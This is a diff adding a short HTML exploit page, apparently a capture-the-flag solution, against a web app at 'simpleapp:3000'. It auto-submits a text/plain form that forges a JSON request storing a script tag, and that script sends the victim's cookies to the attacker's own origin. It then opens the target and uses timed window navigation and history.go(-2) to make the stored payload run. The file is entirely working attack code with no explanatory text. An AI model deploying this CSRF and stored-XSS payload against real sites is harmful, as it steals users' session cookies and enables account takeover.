@@ -1,0 +1,29 @@
+<html>
+    <body>
+        <form action="" method="post" enctype="text/plain" target="_blank">
+            <input type="text">
+        </form>
+    </body>
+    <script>
+        const TARGET = new URL('http://simpleapp:3000')
+        const f1 = document.querySelector("form")
+        f1.action = TARGET.origin + "/api/note"
+        const inp1 = document.querySelector("input")
+        inp1.name = '{"note":"'
+        inp1.value = '<script>document.location=`'+location.origin+'?${document.cookie}`<\/script>"}'
+        f1.submit()
+
+        const sleep = (ms) => new Promise((res)=>setTimeout(res, ms))
+        // referensi: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote
+        {(async()=>{
+            await sleep(1000)
+            const w = open(TARGET.origin+"/api/note")
+            await sleep(1000)
+            w.location = TARGET.origin+"/"
+            await sleep(1000)
+            w.location = "about:blank"
+            await sleep(100)
+            w.history.go(-2)
+        })()}
+    </script>
+</html>
